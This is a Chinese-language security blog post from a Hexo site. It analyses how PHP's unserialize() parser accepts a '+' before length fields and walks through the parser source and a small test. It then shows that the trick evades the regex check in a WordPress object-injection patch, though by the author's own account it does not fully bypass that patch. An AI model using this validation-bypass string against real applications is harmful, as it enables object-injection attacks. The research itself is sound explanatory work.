<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Blog,L.N.,渗透测试,APT,代码审计,程序开发,网络安全,信息安全" />










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/6/index.html">
<meta property="og:site_name" content="Hexo">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/6/"/>





  <title>Hexo</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description"></h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/09/14/php反序列unserialize的一个小特性/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2013/09/14/php反序列unserialize的一个小特性/" itemprop="url">php反序列unserialize的一个小特性</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-09-14T18:42:59+08:00">
                2013-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">in</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
                    <span itemprop="name">PHP|MYSQL学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp; &nbsp; &nbsp; 这几天wordpress的那个反序列漏洞比较火，具体漏洞我就不做分析了，看这篇：<a href="http://drops.wooyun.org/papers/596，" target="_blank" rel="noopener">http://drops.wooyun.org/papers/596，</a>&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">你也可以去看英文的原文：<a href="http://vagosec.org/2013/09/wordpress-php-object-injection/。" target="_blank" rel="noopener">http://vagosec.org/2013/09/wordpress-php-object-injection/。</a>&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">wp官网打了补丁，我试图去bypass补丁，但让我自以为成功的时候，发现我天真了，并没有成功绕过wp的补丁，但却发现了unserialize的一个小特性，在此和大家分享一下。&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">1.unserialize()函数相关源码：&nbsp;</span></p>
<p>`if ((YYLIMIT - YYCURSOR) &lt; 7) YYFILL(7);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &#42YYCURSOR;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch (yych) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’C’:&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’O’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy13;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’N’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy5;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’R’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy2;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’S’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy10;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’a’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy11;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’b’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy6;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’d’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy8;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’i’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy7;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’o’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy12;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’r’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy4;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’s’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy9;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’}’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy14;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy16;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">上边这段代码是判断序列串的处理方式，如序列串O:4:”test”:1:{s:1:”a”;s:3:”aaa”;},处理这个序列串，先获取字符串第一个字符为O，然后case ’O’:&nbsp;&nbsp;goto yy13&nbsp;</span></p>
<p>`yy13:&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42(YYMARKER = ++YYCURSOR);&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yych == ’:’) goto yy17;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy3;`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">从上边代码看出，指针移动一位指向第二个字符，判断字符是否为:，然后 goto yy17&nbsp;</span></p>
<p>`yy17:&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42++YYCURSOR;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yybm[0+yych] &amp; 128) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy20;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yych == ’+’) goto yy19;&nbsp;</p>
<p>…….&nbsp;</p>
<p>yy19:&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42++YYCURSOR;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yybm[0+yych] &amp; 128) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy20;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy18;`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">从上边代码看出，指针移动，判断下一位字符，如果字符是数字直接goto yy20，如果是’+’就goto yy19，而yy19中是对下一位字符判断，如果下一位字符是数字goto yy20，不是就goto yy18，yy18是直接退出序列处理，yy20是对object性的序列的处理，所以从上边可以看出：&nbsp;</span></p>
<p>`O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}&nbsp;</p>
<p>O:4:”test”:1:{s:1:”a”;s:3:”aaa”;}`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">都能够被unserialize反序列化，且结果相同。&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">2.实际测试：&nbsp;</span></p>
<p>`&lt;?php&nbsp;</p>
<p>var_dump(unserialize(’O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}’));&nbsp;</p>
<p>var_dump(unserialize(’O:4:”test”:1:{s:1:”a”;s:3:”aaa”;}’));&nbsp;</p>
<p>?&gt;`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">输出：&nbsp;</span></p>
<p>`object(<strong>PHP_Incomplete_Class)#1 (2) { [“</strong>PHP_Incomplete_Class_Name”]=&gt; string(4) “test” [“a”]=&gt; string(3) “aaa” }&nbsp;</p>
<p>object(<strong>PHP_Incomplete_Class)#1 (2) { [“</strong>PHP_Incomplete_Class_Name”]=&gt; string(4) “test” [“a”]=&gt; string(3) “aaa” }`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">其实，不光object类型处理可以多一个’+’,其他类型也可以，具体测试不做过多描述。&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">3.我们看下wp的补丁：&nbsp;</span></p>
<p>`function is_serialized( $data, $strict = true ) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if it isn’t a string, it isn’t serialized&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ! is_string( $data ) )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = trim( $data );&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( ’N;’ == $data )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$length = strlen( $data );&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $length &lt; 4 )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’:’ !== $data[1] )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $strict ) {//output&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$lastc = $data[ $length - 1 ];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’;’ !== $lastc &amp;&amp; ’}’ !== $lastc )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {//input&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$semicolon = strpos( $data, ’;’ );&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$brace&nbsp;&nbsp;&nbsp;&nbsp; = strpos( $data, ’}’ );&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Either ; or } must exist.&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false === $semicolon &amp;&amp; false === $brace )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// But neither must be in the first X characters.&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false !== $semicolon &amp;&amp; $semicolon &lt; 3 )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false !== $brace &amp;&amp; $brace &lt; 4 )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$token = $data[0];&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch ( $token ) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’s’ :&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $strict ) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’”’ !== $data[ $length - 2 ] )&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif ( false === strpos( $data, ’”’ ) ) {&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’a’ :&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’O’ :&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo “a”;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (bool) preg_match( “/^{$token}:[0-9]+:/s”, $data );&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’b’ :&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’i’ :&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’d’ :&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$end = $strict ? ’$’ : ’’;&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (bool) preg_match( “/^{$token}:[0-9.E-]+;$end/“, $data );&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
<p>}`</p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">补丁中的&nbsp;</span></p>
<p><code>return (bool) preg_match( &quot;/^{$token}:[0-9]+:/s&quot;, $data );</code></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">可以多一个’+’来绕过，虽然我们通过这个方法把序列值写入了数据库，但从数据库中提取数据，再次验证的时候却没法绕过了，我这个加号没能使数据进出数据库发生任何变化，我个人认为这个补丁绕过重点在于数据进出数据的前后变化。&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">4.总结&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">虽然没有绕过wp补丁，但这个unserialize()的小特性可能会被很多开发人员忽略，导致程序出现安全缺陷。&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">以上的分析有什么错误请留言指出。&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">5.参考&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">《WordPress &lt; 3.6.1 PHP Object Injection》&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;"><a href="http://vagosec.org/2013/09/wordpress-php-object-injection/" target="_blank" rel="noopener">http://vagosec.org/2013/09/wordpress-php-object-injection/</a>&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">《var_unserializer.c源码》&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;"><a href="https://github.com/php/php-src/blob/73cd2e0ab14d804c6bf0b689490bdd4fd6e969b1/ext/standard/var_unserializer.c" target="_blank" rel="noopener">https://github.com/php/php-src/blob/73cd2e0ab14d804c6bf0b689490bdd4fd6e969b1/ext/standard/var_unserializer.c</a>&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">《PHP string序列化与反序列化语法解析不一致带来的安全隐患》&nbsp;</span></p>
<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;"><a href="http://zone.wooyun.org/content/1664" target="_blank" rel="noopener">http://zone.wooyun.org/content/1664</a></span></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
